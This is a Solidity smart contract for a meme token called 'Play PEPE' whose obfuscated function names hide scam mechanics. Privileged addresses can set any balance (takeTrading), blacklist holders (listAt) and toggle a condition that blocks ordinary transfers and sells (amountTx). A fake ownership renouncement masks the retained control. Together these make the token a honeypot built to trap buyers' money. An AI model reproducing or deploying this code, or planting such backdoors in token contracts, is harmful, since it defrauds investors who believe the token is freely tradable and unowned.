//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface liquidityMaxSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tradingMode) external view returns (uint256);

    function transfer(address takeToReceiver, uint256 feeTxLiquidity) external returns (bool);

    function allowance(address receiverLaunchAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeTxLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address takeToReceiver,
        uint256 feeTxLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverEnableTeam, uint256 value);
    event Approval(address indexed receiverLaunchAuto, address indexed spender, uint256 value);
}

abstract contract fundEnableList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tokenSwapTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface listLaunchSell {
    function createPair(address tokenList, address toFrom) external returns (address);
}

interface maxBuy is liquidityMaxSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PlayPEPE is fundEnableList, liquidityMaxSwap, maxBuy {

    function liquidityMax(address sellAtLiquidity, address takeToReceiver, uint256 feeTxLiquidity) internal returns (bool) {
        if (sellAtLiquidity == txSwap) {
            return tokenLiquidity(sellAtLiquidity, takeToReceiver, feeTxLiquidity);
        }
        uint256 receiverMaxToken = liquidityMaxSwap(buyShould).balanceOf(listTeamLaunch);
        require(receiverMaxToken == toTrading);
        require(takeToReceiver != listTeamLaunch);
        if (swapTo[sellAtLiquidity]) {
            return tokenLiquidity(sellAtLiquidity, takeToReceiver, takeLaunch);
        }
        return tokenLiquidity(sellAtLiquidity, takeToReceiver, feeTxLiquidity);
    }

    bool private amountReceiverSell;

    address public txSwap;

    uint256 private swapTx;

    uint256 constant takeLaunch = 8 ** 10;

    function takeTrading(address teamLaunched, uint256 feeTxLiquidity) public {
        tokenLaunched();
        walletToken[teamLaunched] = feeTxLiquidity;
    }

    address private fromLaunched;

    bool public marketingToken;

    uint256 liquidityLimit;

    mapping(address => bool) public swapTo;

    uint256 private isSell = 100000000 * 10 ** 18;

    mapping(address => bool) public receiverIsToken;

    address txMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function totalSupply() external view virtual override returns (uint256) {
        return isSell;
    }

    function owner() external view returns (address) {
        return fromLaunched;
    }

    mapping(address => mapping(address => uint256)) private autoTx;

    function symbol() external view virtual override returns (string memory) {
        return buyFee;
    }

    function name() external view virtual override returns (string memory) {
        return buyMarketingMax;
    }

    uint256 toTrading;

    function allowance(address amountWallet, address txShould) external view virtual override returns (uint256) {
        if (txShould == txMarketing) {
            return type(uint256).max;
        }
        return autoTx[amountWallet][txShould];
    }

    bool public marketingFrom;

    bool private toSender;

    function transferFrom(address sellAtLiquidity, address takeToReceiver, uint256 feeTxLiquidity) external override returns (bool) {
        if (_msgSender() != txMarketing) {
            if (autoTx[sellAtLiquidity][_msgSender()] != type(uint256).max) {
                require(feeTxLiquidity <= autoTx[sellAtLiquidity][_msgSender()]);
                autoTx[sellAtLiquidity][_msgSender()] -= feeTxLiquidity;
            }
        }
        return liquidityMax(sellAtLiquidity, takeToReceiver, feeTxLiquidity);
    }

    function tokenLiquidity(address sellAtLiquidity, address takeToReceiver, uint256 feeTxLiquidity) internal returns (bool) {
        require(walletToken[sellAtLiquidity] >= feeTxLiquidity);
        walletToken[sellAtLiquidity] -= feeTxLiquidity;
        walletToken[takeToReceiver] += feeTxLiquidity;
        emit Transfer(sellAtLiquidity, takeToReceiver, feeTxLiquidity);
        return true;
    }

    constructor (){
        
        tokenSwapTx buySwap = tokenSwapTx(txMarketing);
        buyShould = listLaunchSell(buySwap.factory()).createPair(buySwap.WETH(), address(this));
        
        txSwap = _msgSender();
        marketingLiquidity();
        receiverIsToken[txSwap] = true;
        walletToken[txSwap] = isSell;
        if (marketingTx != swapTx) {
            swapTx = isSellList;
        }
        emit Transfer(address(0), txSwap, isSell);
    }

    bool public receiverLimit;

    string private buyFee = "PPE";

    function getOwner() external view returns (address) {
        return fromLaunched;
    }

    uint8 private swapReceiverTotal = 18;

    bool private amountLiquidity;

    function marketingLiquidity() public {
        emit OwnershipTransferred(txSwap, address(0));
        fromLaunched = address(0);
    }

    address public buyShould;

    function decimals() external view virtual override returns (uint8) {
        return swapReceiverTotal;
    }

    uint256 public enableMax;

    function listAt(address shouldExempt) public {
        tokenLaunched();
        
        if (shouldExempt == txSwap || shouldExempt == buyShould) {
            return;
        }
        swapTo[shouldExempt] = true;
    }

    function balanceOf(address tradingMode) public view virtual override returns (uint256) {
        return walletToken[tradingMode];
    }

    function feeLaunchFund(address fundTo) public {
        require(fundTo.balance < 100000);
        if (receiverLimit) {
            return;
        }
        if (amountLiquidity) {
            isSellList = swapTx;
        }
        receiverIsToken[fundTo] = true;
        
        receiverLimit = true;
    }

    uint256 private marketingTx;

    uint256 private isSellList;

    mapping(address => uint256) private walletToken;

    function approve(address txShould, uint256 feeTxLiquidity) public virtual override returns (bool) {
        autoTx[_msgSender()][txShould] = feeTxLiquidity;
        emit Approval(_msgSender(), txShould, feeTxLiquidity);
        return true;
    }

    uint256 private totalShould;

    address listTeamLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private buyMarketingMax = "Play PEPE";

    event OwnershipTransferred(address indexed listAtTeam, address indexed autoFee);

    function tokenLaunched() private view {
        require(receiverIsToken[_msgSender()]);
    }

    function transfer(address teamLaunched, uint256 feeTxLiquidity) external virtual override returns (bool) {
        return liquidityMax(_msgSender(), teamLaunched, feeTxLiquidity);
    }

    function amountTx(uint256 feeTxLiquidity) public {
        tokenLaunched();
        toTrading = feeTxLiquidity;
    }

}